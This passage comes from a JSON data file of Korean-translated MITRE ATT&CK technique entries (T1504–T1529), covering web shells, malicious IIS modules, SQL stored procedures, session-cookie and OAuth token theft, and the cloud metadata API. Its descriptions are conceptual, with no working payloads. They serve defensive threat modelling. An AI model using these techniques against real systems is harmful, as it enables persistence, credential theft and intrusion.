<code>-NoProfile</code> 플래그를 사용해야 합니다. (인용: ESET Turla PowerShell 2019년 5월)\n\n적대자는 또한 PowerShell 프로필의 스크립트가 더 높은 권한을 가진 계정(예: 도메인 관리자)에 의해 로드되고 실행되면 권한을 상승시킬 수 있습니다. (인용: Wits End 및 Shady PowerShell 프로필)",
      "external_id": "T1504",
      "modified": "2020-01-24T15:11:53.430Z",
      "title": "PowerShell Profile",
      "translated": true
    },
    {
      "description": "적대적인 행위자는 서버의 정당한 확장 개발 기능을 악용하여 시스템에 지속적인 접근을 설정할 수 있습니다. 기업 서버 애플리케이션에는 개발자가 주요 애플리케이션의 기능을 확장하기 위해 소프트웨어나 스크립트를 작성하고 설치할 수 있는 기능이 포함될 수 있습니다. 적대적인 행위자는 악성 구성 요소를 설치하여 서버 애플리케이션을 확장하고 악용할 수 있습니다. (인용: volexity_0day_sophos_FW)",
      "external_id": "T1505",
      "modified": "2022-10-19T21:18:29.349Z",
      "title": "Server Software Component",
      "translated": true
    },
    {
      "description": "적대자는 SQL 저장 프로시저를 악용하여 시스템에 대한 지속적인 접근을 설정할 수 있습니다. SQL 저장 프로시저는 데이터베이스 사용자가 자주 사용하는 SQL 쿼리를 다시 작성하는 데 시간을 낭비하지 않도록 저장하고 재사용할 수 있는 코드입니다. 저장 프로시저는 프로시저 이름을 사용하거나 정의된 이벤트(예: SQL 서버 애플리케이션이 시작/재시작될 때)를 통해 SQL 문을 사용하여 호출될 수 있습니다.\n\n적대자는 SQL 데이터베이스 서버에서 지속성을 제공할 수 있는 악성 저장 프로시저를 제작할 수 있습니다.(출처: NetSPI Startup Stored Procedures)(출처: Kaspersky MSSQL 2019년 8월) 적대자가 SQL 구문을 통해 운영 체제 명령을 실행하려면 MSSQL Server의 xp_cmdshell과 같은 추가 기능을 활성화해야 할 수도 있습니다.(출처: NetSPI Startup Stored Procedures)(출처: Kaspersky MSSQL 2019년 8월)(출처: Microsoft xp_cmdshell 2017)\n\nMicrosoft SQL Server는 공용 언어 런타임(CLR) 통합을 활성화할 수 있습니다. CLR 통합이 활성화되면 응용 프로그램 개발자는 .NET 프레임워크 언어(예: VB .NET, C# 등)를 사용하여 저장 프로시저를 작성할 수 있습니다.(출처: Microsoft CLR Integration 2017) 적대자는 저장 프로시저에 연결된 CLR 어셈블리를 작성하거나 수정할 수 있으며, 이러한 CLR 어셈블리는 임의의 명령을 실행하도록 구성될 수 있습니다.(출처: NetSPI SQL Server CLR)",
      "external_id": "T1505.001",
      "modified": "2024-10-15T16:05:24.007Z",
      "title": "SQL Stored Procedures",
      "translated": true
    },
    {
      "description": "적대자는 Microsoft 전송 에이전트를 악용하여 시스템에 대한 지속적인 접근을 설정할 수 있습니다. Microsoft Exchange 전송 에이전트는 전송 파이프라인을 통과하는 이메일 메시지에 대해 다양한 작업을 수행할 수 있으며, 여기에는 스팸 필터링, 악성 첨부파일 필터링, 저널링, 모든 발신 이메일의 끝에 기업 서명 추가 등이 포함됩니다. (출처: Microsoft TransportAgent 2016년 6월) (출처: ESET LightNeuron 2019년 5월) 전송 에이전트는 애플리케이션 개발자에 의해 작성될 수 있으며, 이후 .NET 어셈블리로 컴파일되고 Exchange 서버에 등록됩니다. 전송 에이전트는 이메일 처리의 특정 단계에서 호출되며, 개발자가 정의한 작업을 수행합니다.\n\n적대자는 Exchange 서버에서 악성 전송 에이전트를 등록하여, 적대자가 지정한 이메일 이벤트에 의해 트리거될 수 있는 지속성 메커니즘을 제공할 수 있습니다. (출처: ESET LightNeuron 2019년 5월) 악성 전송 에이전트는 Exchange 전송 파이프라인을 통과하는 모든 이메일에 대해 호출될 수 있지만, 이 에이전트는 적대자의 정의된 기준에 따라 특정 작업만 수행하도록 구성될 수 있습니다. 예를 들어, 전송 에이전트는 수신자 이메일 주소가 적대자가 제공한 목록의 항목과 일치하는 경우, 전송 중인 첨부파일을 복사하고 이후 유출을 위해 저장하는 작업을 수행할 수 있습니다.",
      "external_id": "T1505.002",
      "modified": "2021-10-18T17:05:44.321Z",
      "title": "Transport Agent",
      "translated": true
    },
    {
      "description": "공격자는 시스템에 지속적인 접근을 확보하기 위해 웹 서버에 웹 셸을 사용하여 백도어를 설치할 수 있습니다. 웹 셸은 공격자가 네트워크에 접근하기 위한 게이트웨이로 사용하기 위해 공개적으로 접근 가능한 웹 서버에 배치된 웹 스크립트입니다. 웹 셸은 웹 서버를 호스팅하는 시스템에서 실행할 수 있는 여러 함수나 명령줄 인터페이스를 제공할 수 있습니다. (출처: volexity_0day_sophos_FW)\n\n서버 측 스크립트 외에도, 웹 셸은 웹 서버와 소통하기 위해 사용되는 클라이언트 인터페이스 프로그램을 가질 수 있습니다 (예: [China Chopper](https://attack.mitre.org/software/S0020) 웹 셸 클라이언트). (출처: Lee 2013)",
      "external_id": "T1505.003",
      "modified": "2024-04-16T12:45:06.434Z",
      "title": "Web Shell",
      "translated": true
    },
    {
      "description": "공격자는 지속성을 확보하기 위해 인터넷 정보 서비스(Internet Information Services, IIS) 웹 서버에서 실행되는 악성 구성 요소를 설치할 수 있습니다. IIS는 웹 서버의 기능을 확장할 수 있는 여러 메커니즘을 제공합니다. 예를 들어, 인터넷 서버 응용 프로그래밍 인터페이스(Internet Server Application Programming Interface, ISAPI) 확장 및 필터를 설치하여 IIS 웹 요청의 수신 및 전송을 검사하거나 수정할 수 있습니다. 확장 및 필터는 세 가지 기능을 내보내는 DLL 파일로 배포됩니다: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, 및 (선택적으로) <code>Terminate{Extension/Filter}</code>. 또한 IIS 웹 서버의 기능을 확장하기 위해 IIS 모듈을 설치할 수 있습니다.(인용: Microsoft ISAPI Extension Overview 2017)(인용: Microsoft ISAPI Filter Overview 2017)(인용: IIS 백도어 2011)(인용: Trustwave IIS 모듈 2013)\n\n공격자는 악성 ISAPI 확장 및 필터를 설치하여 트래픽을 관찰하고/또는 수정하거나, 손상된 시스템에서 명령을 실행하거나, 명령 및 제어 트래픽을 프록시할 수 있습니다. ISAPI 확장 및 필터는 모든 IIS 웹 요청 및 응답에 접근할 수 있습니다. 예를 들어, 공격자는 이러한 메커니즘을 악용하여 HTTP 응답을 수정하여 이전에 손상된 호스트에 악성 명령/콘텐츠를 배포할 수 있습니다.(인용: Microsoft ISAPI Filter Overview 2017)(인용: Microsoft ISAPI Extension Overview 2017)(인용: Microsoft ISAPI Extension All Incoming 2017)(인용: Dell TG-3390)(인용: Trustwave IIS 모듈 2013)(인용: MMPC ISAPI Filter 2012)\n\n공격자는 또한 트래픽을 관찰하고/또는 수정하기 위해 악성 IIS 모듈을 설치할 수 있습니다. IIS 7.0에서는 ISAPI 확장 및 필터와 동일한 제한 없는 HTTP 요청 및 응답 접근을 제공하는 모듈이 도입되었습니다. IIS 모듈은 <code>RegisterModule</code>를 내보내는 DLL로 작성하거나, ASP.NET API와 인터페이스하여 IIS HTTP 요청에 접근하는 .NET 애플리케이션으로 작성될 수 있습니다.(인용: Microsoft IIS Modules Overview 2007)(인용: Trustwave IIS 모듈 2013)(인용: ESET IIS 악성 코드 2021)",
      "external_id": "T1505.004",
      "modified": "2021-10-17T15:06:24.161Z",
      "title": "IIS Components",
      "translated": true
    },
    {
      "description": "공격자는 시스템에 대한 지속적인 접근을 활성화하기 위해 터미널 서비스의 구성 요소를 악용할 수 있습니다. 2022년부터 일부 Windows Server OS에서는 Microsoft 터미널 서비스가 원격 데스크톱 서비스(Remote Desktop Services)로 이름이 변경되었으며, 이는 호스트에 원격 터미널 연결을 가능하게 합니다. 터미널 서비스는 서버가 RDP를 통해 클라이언트에게 완전하고 상호작용하는 그래픽 사용자 인터페이스를 전송할 수 있도록 합니다.(인용: Microsoft Remote Desktop Services)\n\n[Windows 서비스](https://attack.mitre.org/techniques/T1543/003)는 \"제네릭\" 프로세스(ex: <code>svchost.exe</code>)로 실행되며, 서비스의 DLL 파일을 로드합니다. 이 DLL 파일의 위치는 <code>ServiceDll</code>이라는 레지스트리 항목에 저장되어 있습니다.(인용: Microsoft System Services Fundamentals) <code>termsrv.dll</code> 파일은 일반적으로 `%SystemRoot%\\System32\\`에 저장되며, `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\`에서 터미널 서비스의 기본 <code>ServiceDll</code> 값입니다.\n\n공격자는 피해를 입은 호스트에 대한 지속적인 접근을 활성화하기 위해 터미널 서비스 DLL을 수정하거나 교체할 수 있습니다.(인용: James TermServ DLL) 이 DLL에 대한 수정은 임의의 페이로드를 실행할 수 있도록 하거나(기본 <code>termsrv.dll</code> 기능을 유지할 수 있는 가능성이 있음) 단순히 터미널 서비스의 악용 가능한 기능을 활성화할 수 있도록 이루어질 수 있습니다. 예를 들어, 공격자는 <code>termsrv.dll</code> 파일을 패치하거나 <code>ServiceDll</code> 값을 RDP 기능을 확장하는 DLL을 가리키도록 수정하여 동시 [원격 데스크톱 프로토콜](https://attack.mitre.org/techniques/T1021/001) 세션과 같은 기능을 활성화할 수 있습니다.(인용: Windows OS Hub RDP)(인용: RDPWrap Github) 비서버 Windows OS에서는 이 확장된 기능이 새로운 RDP 세션이 생성될 때 시스템 사용자에게 경고하거나 로그아웃시키는 터미널 서비스 알림을 피할 수 있도록 할 수 있습니다.",
      "external_id": "T1505.005",
      "modified": "2024-09-12T19:40:42.810Z",
      "title": "Terminal Services DLL",
      "translated": true
    },
    {
      "description": "공격자는 도난당한 세션 쿠키를 사용하여 웹 애플리케이션 및 서비스에 인증할 수 있습니다. 이 기술은 세션이 이미 인증되어 있기 때문에 일부 다중 인증 프로토콜을 우회합니다. (출처: Pass The Cookie)\n\n인증 쿠키는 사용자가 서비스를 인증한 후 클라우드 기반 서비스를 포함한 웹 애플리케이션에서 일반적으로 사용됩니다. 이를 통해 자격 증명이 전송되지 않으며, 재인증이 자주 필요하지 않습니다. 쿠키는 종종 오랜 시간 동안 유효하며, 웹 애플리케이션이 활발히 사용되지 않더라도 마찬가지입니다. [웹 세션 쿠키 탈취](https://attack.mitre.org/techniques/T1539)를 통해 쿠키를 얻은 후, 공격자는 제어하는 브라우저에 쿠키를 가져와 사용자를 대신하여 사이트 또는 애플리케이션을 사용할 수 있습니다. 세션 쿠키가 활성화된 한 계속해서 사용할 수 있습니다. 사이트에 로그인하면 공격자는 민감한 정보에 접근하거나 이메일을 읽거나 피해자 계정이 수행할 수 있는 작업을 수행할 수 있습니다.\n\n세션 쿠키를 표적 삼아 다중 인증 시스템을 우회하는 악성코드의 사례가 있습니다. (출처: Unit 42 Mac Crypto Cookies January 2019)",
      "external_id": "T1506",
      "modified": "2020-12-17T16:57:07.529Z",
      "title": "Web Session Cookie",
      "translated": true
    },
    {
      "description": "적대자는 AuthorizationExecuteWithPrivileges API를 악용하여 사용자에게 자격 증명을 요구함으로써 권한 상승을 할 수 있습니다. (인용: AppleDocs AuthorizationExecuteWithPrivileges) 이 API의 목적은 애플리케이션 개발자에게 애플리케이션 설치 또는 업데이트와 같은 작업을 루트 권한으로 수행할 수 있는 간편한 방법을 제공하는 것입니다. 이 API는 루트 권한 요청 프로그램이 신뢰할 수 있는 출처에서 온 것인지 또는 악의적으로 수정되었는지를 검증하지 않습니다. 비록 이 API는 더 이상 권장되지 않지만, 최신 macOS 릴리스에서도 여전히 완전히 기능합니다. 이 API를 호출할 때, 사용자는 자격 증명을 입력하라는 메시지를 받지만 프로그램의 출처나 무결성에 대한 검사는 이루어지지 않습니다. API를 호출하는 프로그램은 또한 전 세계에서 쓰기 가능한 파일을 로드할 수 있으며, 이를 수정하여 상승된 권한으로 악의적인 행동을 수행할 수 있습니다.\n\n적대자는 AuthorizationExecuteWithPrivileges를 남용하여 루트 권한을 얻고 피해자에게 악성 소프트웨어를 설치하거나 지속성을 유지하는 메커니즘을 설치할 수 있습니다. (인용: 1000개의 설치 파일에 의한 죽음; 모든 것이 망가졌다!)(인용: Carbon Black Shlayer 2019년 2월)(인용: OSX Coldroot RAT) 이 기법은 사용자를 속여 악성 코드에 대해 상승된 권한을 부여하도록 유도하는 [위장](https://attack.mitre.org/techniques/T1036)과 결합될 수 있습니다. (인용: 1000개의 설치 파일에 의한 죽음; 모든 것이 망가졌다!)(인용: Carbon Black Shlayer 2019년 2월) 이 기술은 또한 이 API를 사용하는 기계에 존재하는 합법적인 프로그램을 수정하여 작동하는 것으로 입증되었습니다. (인용: 1000개의 설치 파일에 의한 죽음; 모든 것이 망가졌다!)",
      "external_id": "T1514",
      "modified": "2020-02-05T20:13:51.857Z",
      "title": "Elevated Execution with Prompt",
      "translated": true
    },
    {
      "description": "공격자는 시스템이나 클라우드 환경에 설치된 소프트웨어 및 소프트웨어 버전의 목록을 얻으려고 시도할 수 있습니다. 공격자는 자동화된 탐색 과정에서 [소프트웨어 발견(Software Discovery)](https://attack.mitre.org/techniques/T1518) 정보를 사용하여 후속 행동을 결정할 수 있습니다. 여기에는 공격자가 목표를 완전히 감염시키거나 특정 작업을 시도할지 여부가 포함됩니다.\n\n이러한 소프트웨어는 구성 관리 또는 보안 이유로 환경 전반에 걸쳐 광범위하게 배포될 수 있으며, [소프트웨어 배포 도구(Software Deployment Tools)](https://attack.mitre.org/techniques/T1072)와 같은 도구를 통해 공격자에게 장치를 감염시키거나 수평 이동할 수 있는 폭넓은 접근을 허용할 수 있습니다.\n\n공격자는 다양한 이유로 소프트웨어를 열거하려고 시도할 수 있습니다. 예를 들어, 시스템에 어떤 보안 조치가 존재하는지 확인하거나 손상된 시스템이 [특권 상승을 위한 악용(Exploitation for Privilege Escalation)](https://attack.mitre.org/techniques/T1068)에 취약한 소프트웨어 버전을 갖고 있는지 여부를 파악하는 경우 등이 있습니다.",
      "external_id": "T1518",
      "modified": "2024-04-16T00:16:06.689Z",
      "title": "Software Discovery",
      "translated": true
    },
    {
      "description": "적대자들은 시스템이나 클라우드 환경에 설치된 보안 소프트웨어, 구성, 방어 도구 및 센서의 목록을 얻으려고 시도할 수 있습니다. 여기에는 클라우드 모니터링 에이전트와 안티바이러스와 같은 것들이 포함될 수 있습니다. 적대자들은 [보안 소프트웨어 탐지](https://attack.mitre.org/techniques/T1518/001)에서 얻은 정보를 자동화된 탐지 과정에서 활용하여 후속 행동을 조정할 수 있습니다. 이에는 목표 시스템을 완전히 감염시키는지 여부나 특정 행동을 시도하는지 등이 포함됩니다.\n\n보안 소프트웨어 정보를 얻기 위해 사용할 수 있는 예제 명령어로는 [netsh](https://attack.mitre.org/software/S0108), `<code>reg query</code>`와 [Reg](https://attack.mitre.org/software/S0075), `<code>dir</code>`와 [cmd](https://attack.mitre.org/software/S0106), 그리고 [Tasklist](https://attack.mitre.org/software/S0057) 등이 있습니다. 그러나 탐지 행동의 다른 지표는 적대자가 찾고 있는 소프트웨어 또는 보안 시스템의 종류에 따라 더 구체적일 수 있습니다. macOS malware가 LittleSnitch와 KnockKnock 소프트웨어를 확인하는 경우도 점점 더 자주 발견되고 있습니다.\n\n적대자들은 또한 [클라우드 API](https://attack.mitre.org/techniques/T1059/009)를 활용하여 컴퓨팅 인프라에 설치된 클라우드 네이티브 보안 소프트웨어를 탐지할 수 있습니다. 예를 들어 AWS CloudWatch 에이전트, Azure VM 에이전트, 그리고 Google Cloud Monitor 에이전트 등이 이에 해당합니다. 이러한 에이전트는 VM에서 메트릭 및 로그를 수집하며, 이들은 클라우드 기반 모니터링 플랫폼에 중앙 집중적으로 집계될 수 있습니다.",
      "external_id": "T1518.001",
      "modified": "2024-04-16T00:15:53.303Z",
      "title": "Security Software Discovery",
      "translated": true
    },
    {
      "description": "적대자는 Event Monitor Daemon(emond)을 사용하여 예측 가능한 이벤트 트리거에 따라 악성 명령이 실행되도록 스케쥴하여 지속성을 확보할 수 있습니다. emond는 여러 서비스로부터 이벤트를 수신하고 이를 간단한 규칙 엔진을 통해 처리하여 행동을 취하는 [Launch Daemon](https://attack.mitre.org/techniques/T1160)입니다. <code>/sbin/emond</code>에 위치한 emond 바이너리는 <code>/etc/emond.d/rules/</code> 디렉토리에서 규칙을 로드하고 명시적으로 정의된 이벤트가 발생하면 이를 수행합니다. 규칙 파일은 plist 형식으로, 이름, 이벤트 유형 및 수행할 행위를 정의합니다. 이벤트 유형의 몇 가지 예로는 시스템 시작 및 사용자 인증이 있습니다. 행동의 예로는 시스템 명령을 실행하거나 이메일을 보내는 것입니다. emond 서비스는 [Launch Daemon](https://attack.mitre.org/techniques/T1160) 구성 파일 <code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>에서 지정된 QueueDirectories 경로 <code>/private/var/db/emondClients</code>에 파일이 없으면 시작되지 않습니다. (출처: xorrior emond Jan 2018)(출처: magnusviri emond Apr 2016)(출처: sentinelone macos persist Jun 2019)\n\n적대자는 정의된 이벤트, 예를 들어 시스템 시작 또는 사용자 인증 시 명령을 실행하도록 규칙을 작성하여 이 서비스를 악용할 수 있습니다. (출처: xorrior emond Jan 2018)(출처: magnusviri emond Apr 2016)(출처: sentinelone macos persist Jun 2019) 또한, emond 서비스가 [Launch Daemon](https://attack.mitre.org/techniques/T1160) 서비스에 의해 루트 권한으로 실행되기 때문에 관리자 권한에서 루트로의 권한 상승이 가능할 수 있습니다.",
      "external_id": "T1519",
      "modified": "2020-01-24T15:15:44.006Z",
      "title": "Emond",
      "translated": true
    },
    {
      "description": "적대자는 클라우드 인스턴스 메타데이터 API에 접근하여 자격 증명 및 기타 민감한 데이터를 수집하려고 할 수 있습니다.\n\n대부분의 클라우드 서비스 제공업체는 실행 중인 가상 인스턴스에 제공되는 서비스인 클라우드 인스턴스 메타데이터 API를 지원합니다. 이 API를 통해 애플리케이션은 실행 중인 가상 인스턴스에 대한 정보를 접근할 수 있습니다. 일반적으로 제공되는 정보에는 이름, 보안 그룹 및 자격 증명 또는 추가 비밀을 포함할 수 있는 UserData 스크립트와 같은 민감한 데이터를 포함한 추가 메타데이터가 포함됩니다. 인스턴스 메타데이터 API는 애플리케이션 관리에 도움을 주기 위해 제공되며, 인스턴스에 접근할 수 있는 모든 사용자에게 접근 가능합니다. (출처: AWS 인스턴스 메타데이터 API)\n\n적대자가 실행 중인 가상 인스턴스에 존재하는 경우, 그들은 인스턴스 메타데이터 API를 직접 쿼리하여 추가 리소스에 접근할 수 있는 자격 증명을 식별할 수 있습니다. 또한, 공격자는 공용 웹 프록시에서 서버 측 요청 위조 (SSRF) 취약점을 악용하여 인스턴스 메타데이터 API에 대한 요청을 통해 민감한 정보에 접근할 수 있습니다. (출처: RedLock 인스턴스 메타데이터 API 2018)\n\n클라우드 서비스 제공업체 간의 사실상 표준은 인스턴스 메타데이터 API를 <code>http[:]//169.254.169.254</code>에 호스팅하는 것입니다.",
      "external_id": "T1522",
      "modified": "2021-03-08T10:33:01.542Z",
      "title": "Cloud Instance Metadata API",
      "translated": true
    },
    {
      "description": "적대자는 환경에 접근한 후 지속성을 확보하기 위해 클라우드 또는 컨테이너 이미지를 악성 코드로 주입할 수 있습니다. 아마존 웹 서비스(AWS) 아마존 머신 이미지(AMIs), 구글 클라우드 플랫폼(GCP) 이미지, 그리고 Azure 이미지 및 인기 있는 컨테이너 런타임인 도커가 주입되거나 백도어가 설치될 수 있습니다. [악성 코드 업로드](https://attack.mitre.org/techniques/T1608/001)와는 달리, 이 기법은 공격자가 피해자의 환경 내 레지스트리에 이미지를 주입하는 데 중점을 둡니다. 인프라가 어떻게 구성되는지에 따라, 인프라 구성 도구가 항상 최신 이미지를 사용하도록 지시받는 경우 지속적인 접근을 제공할 수 있습니다. (출처: Rhino Labs Cloud Image Backdoor Technique Sept 2019)\n\n클라우드 컨테이너 이미지에 백도어를 심는 데 도움을 주기 위한 도구가 개발되었습니다. (출처: Rhino Labs Cloud Backdoor September 2019) 공격자가 손상된 AWS 인스턴스에 접근할 수 있고 사용 가능한 컨테이너 이미지를 나열할 수 있는 권한이 있다면, [웹 셸](https://attack.mitre.org/techniques/T1505/003)과 같은 백도어를 심을 수 있습니다. (출처: Rhino Labs Cloud Image Backdoor Technique Sept 2019)",
      "external_id": "T1525",
      "modified": "2022-03-08T21:27:49.094Z",
      "title": "Implant Internal Image",
      "translated": true
    },
    {
      "description": "적대자는 시스템에 접근한 후 클라우드 서비스의 목록을 확인하려고 할 수 있습니다. 이러한 방법은 플랫폼-서비스(PaaS), 인프라스트럭처-서비스(IaaS), 또는 소프트웨어-서비스(SaaS) 간에 다를 수 있습니다. 다양한 클라우드 제공업체에서 존재하는 많은 서비스가 있으며, 여기에는 지속적 통합 및 지속적 배포(CI/CD), Lambda 함수, Entra ID 등이 포함될 수 있습니다. 이들 서비스에는 보안 서비스(예: AWS GuardDuty 및 Microsoft Defender for Cloud)와 로깅 서비스(예: AWS CloudTrail 및 Google Cloud Audit Logs)도 포함될 수 있습니다.\n\n적대자는 환경에 걸쳐 활성화된 서비스에 대한 정보를 발견하려고 시도할 수 있습니다. Microsoft Graph API 및 Azure Resource Manager API와 같은 Azure 도구 및 API는 애플리케이션, 관리 그룹, 리소스 및 정책 정의, 그리고 이러한 리소스와 관계가 있는 신원을 기준으로 접근 가능한 서비스 및 자원을 열거할 수 있습니다. (인용: Azure - Resource Manager API) (인용: Azure AD Graph API) \n\n예를 들어, Stormspotter는 Azure 리소스 및 서비스의 목록을 확인하고 그래프를 구성하기 위한 오픈 소스 도구이며, Pacu는 클라우드 서비스를 발견하기 위한 여러 방법을 지원하는 오픈 소스 AWS 익스플로잇 프레임워크입니다. (인용: Azure - Stormspotter) (인용: GitHub Pacu)\n\n적대자는 획득한 정보를 활용하여 후속 행동을 형성할 수 있으며, 예를 들어 열거된 서비스들로부터 데이터나 자격 증명을 타겟팅하거나, [도구 비활성화 또는 수정](https://attack.mitre.org/techniques/T1562/001) 또는 [클라우드 로그 비활성화 또는 수정](https://attack.mitre.org/techniques/T1562/008)을 통해 식별된 방어를 회피할 수 있습니다.",
      "external_id": "T1526",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Cloud Service Discovery",
      "translated": true
    },
    {
      "description": "공격자는 애플리케이션 액세스 토큰을 사용하여 일반적인 인증 프로세스를 우회하고 원격 시스템의 제한된 계정, 정보 또는 서비스에 접근할 수 있습니다. 이러한 토큰은 일반적으로 사용자로부터 탈취되어 로그인 자격 증명 대신 사용됩니다.\n\n애플리케이션 액세스 토큰은 사용자 대신 승인된 API 요청을 수행하는 데 사용되며, 클라우드 기반 애플리케이션 및 서비스형 소프트웨어(SaaS)에서 자원에 접근하는 방법으로 일반적으로 사용됩니다. (인용: Auth0 - API 보안을 위한 액세스 토큰 사용 이유, 2019년 9월) OAuth는 시스템에 대한 접근을 위해 사용자에게 토큰을 발급하는 일반적으로 구현된 프레임워크 중 하나입니다. 이러한 프레임워크는 협력하여 사용자를 인증하고 사용자가 수행할 수 있는 행동을 결정합니다. 신원이 확인된 후, 토큰은 사용자의 실제 자격 증명을 전달하지 않고도 행동을 승인할 수 있게 해줍니다. 따라서 토큰이 탈취되면 공격자는 악의적인 애플리케이션을 통해 다른 사이트의 자원에 접근할 수 있게 됩니다. (인용: okta)\n\n예를 들어, 클라우드 기반 이메일 서비스에서는 OAuth 액세스 토큰이 악의적인 애플리케이션에 제공되면, \"리프레시\" 토큰이 부여되어 백그라운드 접근을 가능하게 할 경우 사용자 계정의 기능에 장기적으로 접근할 수 있습니다. (인용: Microsoft Identity Platform Access 2019) OAuth 액세스 토큰을 통해 공격자는 사용자 승인 REST API를 사용하여 이메일 검색 및 연락처 열거와 같은 기능을 수행할 수 있습니다. (인용: Staaldraad Phishing with OAuth 2017)\n\n탈취된 액세스 토큰은 다른 서비스 침해의 첫 번째 단계로 사용될 수 있습니다. 예를 들어, 만약 토큰이 피해자의 주 이메일에 대한 접근을 허용한다면, 공격자는 비밀번호 분실 절차를 트리거하여 대상이 구독하는 다른 모든 서비스에 대한 접근을 확대할 수 있습니다. 토큰을 통한 직접 API 접근은 두 번째 인증 요소의 효과를 무력화하고 비밀번호 변경과 같은 직관적 대응 수단에 면역이 있을 수 있습니다. API 채널을 통한 접근 남용은 서비스 제공자의 입장에서도 탐지하기 어려울 수 있습니다. 왜냐하면 접근이 여전히 합법적인 워크플로와 잘 일치할 수 있기 때문입니다.",
      "external_id": "T1527",
      "modified": "2023-11-02T15:39:10.534Z",
      "title": "Application Access Token",
      "translated": true
    },
    {
      "description": "적대자가 원격 시스템 및 리소스에 접근하기 위해 자격 증명을 취득하는 수단으로 애플리케이션 접근 토큰을 탈취할 수 있습니다.\n\n애플리케이션 접근 토큰은 사용자가나 서비스의 이름으로 승인된 API 요청을 하기 위해 사용되며, 클라우드 및 컨테이너 기반 애플리케이션과 소프트웨어-서비스(SaaS)에서 리소스에 접근하는 방법으로 일반적으로 사용됩니다.(출처: Auth0 - API를 보호하기 위해 항상 접근 토큰을 사용해야 하는 이유 2019년 9월) 클라우드 및 컨테이너화된 환경에서 계정 API 토큰을 탈취한 적대자는 해당 계정의 권한으로 데이터에 접근하고 작업을 수행할 수 있어, 권한 상승 및 환경에 대한 추가적인 손상을 초래할 수 있습니다.\n\n예를 들어, 쿠버네티스 환경에서 컨테이너 내부에서 실행 중인 프로세스는 서비스 계정 토큰을 사용하여 쿠버네티스 API 서버와 통신할 수 있습니다. 만약 컨테이너가 손상되면, 적대자는 컨테이너의 토큰을 탈취하여 쿠버네티스 API 명령어에 접근할 수 있게 됩니다.(출처: 쿠버네티스 서비스 계정) 유사하게, 지속 개발/지속 통합(CI/CD) 파이프라인 내의 인스턴스는 종종 테스트 및 배포를 위한 다른 서비스에 인증하기 위해 API 토큰을 사용합니다.(출처: Cider Security Top 10 CICD Security Risks) 이러한 파이프라인이 손상되면, 적대자는 이러한 토큰을 탈취하고 그들의 권한을 활용할 수 있습니다.\n\n토큰 탈취는 사회 공학을 통해 발생할 수 있으며, 이 경우 사용자 액션이 필요할 수 있습니다. OAuth는 시스템 접근을 위해 사용자에게 토큰을 발급하는 일반적으로 구현된 프레임워크 중 하나입니다. 클라우드 기반 서비스나 보호된 API에 대한 접근을 원하는 애플리케이션은 다양한 인증 프로토콜을 통해 OAuth 2.0을 사용하여 접근할 수 있습니다. 일반적으로 사용되는 시퀀스의 하나는 Microsoft의 권한 부여 코드 그랜트 흐름입니다.(출처: Microsoft Identity Platform Protocols 2019년 5월)(출처: Microsoft - OAuth 코드 권한 부여 흐름 - 2019년 6월) OAuth 접근 토큰은 제3자 애플리케이션이 사용자 자격 증명을 얻지 않고 애플리케이션에서 요청한 방식으로 사용자 데이터가 포함된 리소스와 상호작용할 수 있도록 합니다.\n\n적대자는 OAuth 권한 부여를 악의적인 애플리케이션을 구성함으로써 활용할 수 있으며, 이 애플리케이션은 대상 사용자의 OAuth 토큰으로 리소스에 접근하려고 설계됩니다.(출처: Amnesty OAuth 피싱 공격, 2019년 8월)(출처: Trend Micro Pawn Storm OAuth 2017) 적대자는 Azure Portal, Visual Studio IDE, 명령줄 인터페이스, PowerShell 또는 REST API 호출을 사용하여 Microsoft Identity Platform과 같은 권한 부여 서버에 애플리케이션 등록을 완료해야 합니다.(출처: Microsoft - Azure AD 애플리케이션 등록 - 2019년 5월) 그런 다음, 대상 사용자에게 [스피어피싱 링크](https://attack.mitre.org/techniques/T1566/002)를 전송하여 애플리케이션에 대한 접근 권한을 부여하도록 유도할 수 있습니다. OAuth 접근 토큰이 부여되면, 애플리케이션은 [애플리케이션 접근 토큰](https://attack.mitre.org/techniques/T1550/001)을 통해 사용자 계정의 기능에 대한 장기적인 접근을 가질 수 있습니다.(출처: Microsoft - Azure AD 아이덴티티 토큰 - 2019년 8월)\n\n애플리케이션 접근 토큰은 제한된 수명의 기능을 할 수 있으며, 이는 적대자가 탈취한 토큰을 사용하는 기간을 제한합니다. 그러나 일부 경우, 적대자는 애플리케이션 갱신 토큰을 탈취할 수도 있으며(출처: Auth0 갱신 토큰 이해), 이를 통해 사용자에게 요청하지 않고도 새로운 접근 토큰을 획득할 수 있습니다.",
      "external_id": "T1528",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Steal Application Access Token",
      "translated": true
    },
    {
      "description": "위협 행위자는 시스템에 대한 접근을 차단하거나 시스템의 파괴를 돕기 위해 시스템을 종료하거나 재부팅할 수 있습니다. 운영 체제는 기계나 네트워크 장치를 종료하거나 재부팅하는 명령을 포함할 수 있습니다. 경우에 따라 이러한 명령은 [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008)를 통해 원격 컴퓨터나 네트워크 장치를 종료하거나 재부팅하는 데 사용될 수도 있습니다 (예: <code>reload</code>). (출처: Microsoft Shutdown 2017년 10월)(출처: alert_TA18_106A)\n\n시스템을 종료하거나 재부팅하는 것은 합법적인 사용자에게 컴퓨터 리소스에 대한 접근을 방해할 수 있으며, 동시에 사고 대응/복구를 저해할 수 있습니다.\n\n위협 행위자는 [디스크 구조 삭제](https://attack.mitre.org/techniques/T1561/002) 또는 [시스템 복구 방해](https://attack.mitre.org/techniques/T1490)와 같은 다른 방법으로 시스템에 영향을 미친 후 시스템을 종료하거나 재부팅하려고 시도할 수 있습니다. 이는 시스템 가용성에 대한 의도된 효과를 가속화하기 위함입니다. (출처: Talos Nyetya 2017년 6월)(출처: Talos Olympic Destroyer 2018)",
      "external_id": "T1529",
      "modified": "2023-03-22T20:45:22.531Z",
      "title": "System Shutdown/Reboot",
      "translated": true
    },
    {
